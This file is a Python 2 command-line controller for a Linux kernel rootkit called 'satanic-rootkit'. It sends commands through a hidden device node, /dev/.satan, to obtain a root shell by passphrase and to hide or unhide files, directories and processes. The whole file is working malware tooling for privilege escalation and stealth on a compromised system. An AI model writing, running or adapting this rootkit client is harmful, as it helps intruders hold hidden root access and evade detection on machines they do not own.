#!/usr/bin/env python2

import os
import sys

cdev = '/dev/.satan'


def usage():
    return "usage: " + sys.argv[0] + " <command> [argument]\n\n" \
        "-su --privesc <passphrase>       -- Acquire root shell.\n" \
        "-fh --file-hide <path>           -- Hide a file/directory by absolute path.\n" \
        "-fu --file-unhide <path>         -- Unhide a file/directory by absolute path.\n" \
        "-ph --proc-hide <pid>            -- Hide a process by PID.\n" \
        "-pu --proc-unhide <pid>          -- Unhide a process by PID.\n" \
        "\n" \
        "-h --help                        -- Help message.\n" \
        "-v --version                     -- Version info." \

def version():
    return "satanic-rootkit 0.1\n" \
        "Licensed under GPL-2.0. Developed by Marco Wang."

def has_n_args_or_die(min_num):
    if len(sys.argv) < min_num:
        print('error: insufficient arguments\n')
        print(usage())
        sys.exit(1)



if __name__ == '__main__':
    if len(sys.argv) <= 1:
        print(usage())


    elif sys.argv[1] in ['-su', '--privesc']:
        has_n_args_or_die(3)
        command = 'privesc ' + sys.argv[2]
        payload = 'echo \'{}\' > {}'.format(command, cdev)
        with open('.payload', 'w') as f:
            f.write(payload)
        os.system('/usr/bin/env bash --init-file .payload')


    elif sys.argv[1] in ['-fh', '--file-hide']:
        has_n_args_or_die(3)
        with open(cdev, 'w') as f:
            f.write('file_hide {}'.format(sys.argv[2]))


    elif sys.argv[1] in ['-fu', '--file-unhide']:
        has_n_args_or_die(3)
        with open(cdev, 'w') as f:
            f.write('file_unhide {}'.format(sys.argv[2]))


    elif sys.argv[1] in ['-ph', '--proc-hide']:
        has_n_args_or_die(3)
        with open(cdev, 'w') as f:
            f.write('proc_hide {}'.format(sys.argv[2]))


    elif sys.argv[1] in ['-pu', '--proc-unhide']:
        has_n_args_or_die(3)
        with open(cdev, 'w') as f:
            f.write('proc_unhide {}'.format(sys.argv[2]))


    elif sys.argv[1] in ['-h', '--help']:
        print(usage())


    elif sys.argv[1] in ['-v', '--version']:
        print(version())


    else:
        print('error: unknown command')
